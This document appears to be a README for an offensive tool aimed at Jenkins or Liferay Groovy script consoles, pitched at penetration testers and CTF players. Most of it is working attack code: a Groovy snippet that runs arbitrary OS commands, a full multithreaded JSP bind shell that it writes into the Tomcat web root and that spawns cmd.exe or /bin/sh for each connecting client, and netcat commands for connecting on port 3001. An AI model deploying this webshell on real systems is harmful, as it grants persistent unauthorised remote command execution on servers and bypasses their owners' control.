# Bind Shell From Groovy Script Console
a script to write JSP webshells and execute them via the web root. useful for engagements with jenkins\liferay where the script console is enabled and the network firewall is blocking outgoing traffic.
Built for Offensive security tasks and CTF junkies who hate fragile shells.

#### Info
This Groovy script generates a JSP bind shell that supports multithreading.
If you hit CTRL+C or lose the connection, you can simply reconnect.
By default, it listens on port 3001, but you can change that anytime.

#### How to use
0. browse to the groovy script console GUI
2. Figure out where the web root is (tomcat root), this can be performed with `pwd`,`ls`,`dir`

here are some known remote  command executin scripts:
1. POC for simple commands: `pwd`,`ls`,`dir` `cd` ( use to figure out where the web root is)
```
def cmd="YOURCOMMAND-dir"
def sout = new StringBuilder(), serr = new StringBuilder()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

this is where your bind shell will live, if you execute it correctly then you will be able to aceess the shell at `site\threaded.jsp`

paste the following into your groovy console:
```
new File("<PATHTOTOMCAT>/tomcat/ROOT/threaded.jsp").text ='''<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>
<%!
    // Static block to ensure the listener thread is only started once.
    static {
        new Thread(new Runnable() {
            public void run() {
                // --- CONFIGURATION ---
                int port = 3001; // The port to listen on.
                // -------------------

                try {
                    ServerSocket serverSocket = new ServerSocket(port);
                    // This is the key change: an infinite loop to accept multiple clients.
                    while (true) {
                        // Wait for a client to connect. This call blocks until a connection is made.
                        Socket clientSocket = serverSocket.accept();
                        
                        // When a client connects, create a NEW THREAD to handle them.
                        // This allows the main loop to go back and wait for the next client.
                        new Thread(new ClientHandler(clientSocket)).start();
                    }
                } catch (Exception e) {
                    // Fail silently in the background.
                }
            }
        }).start();
    }

    // This class handles the logic for a single connected client.
    static class ClientHandler implements Runnable {
        private final Socket clientSocket;

        ClientHandler(Socket socket) {
            this.clientSocket = socket;
        }

        public void run() {
            try {
                String shell = System.getProperty("os.name").toLowerCase().startsWith("windows") ? "cmd.exe" : "/bin/sh";
                Process process = Runtime.getRuntime().exec(shell);

                // Redirect I/O for this specific client
                new Thread(new StreamRedirector(process.getInputStream(), clientSocket.getOutputStream())).start();
                new Thread(new StreamRedirector(process.getErrorStream(), clientSocket.getOutputStream())).start();
                new Thread(new StreamRedirector(clientSocket.getInputStream(), process.getOutputStream())).start();

                process.waitFor();
            } catch (Exception e) {
                // An exception here usually means the client disconnected.
            } finally {
                try { clientSocket.close(); } catch (IOException e) {}
            }
        }
    }

    // Helper class to redirect streams. No changes needed here.
    static class StreamRedirector implements Runnable {
        private final InputStream in;
        private final OutputStream out;
        StreamRedirector(InputStream in, OutputStream out) { this.in = in; this.out = out; }
        public void run() {
            try {
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = in.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                    out.flush();
                }
            } catch (IOException e) {}
        }
    }
%>
<html>
<body>
    <h1>Persistent Bind Shell Initialized</h1>
    <p>A persistent listener should now be active on port <strong>3001</strong>.</p>
</body>
</html>
'''
```
3. edit the location to save the shell to the correct webroot location
4. hit save and browse to your webshell so it activates `http://site/threaded.jsp`
5. connect to the bind shell via netcat:
```
 example 1:
rlwrap -cAr nc -nv HOST-IP 3001

example 2:
rlwrap -cAr nc -nv 172.16.30.10  3001
```
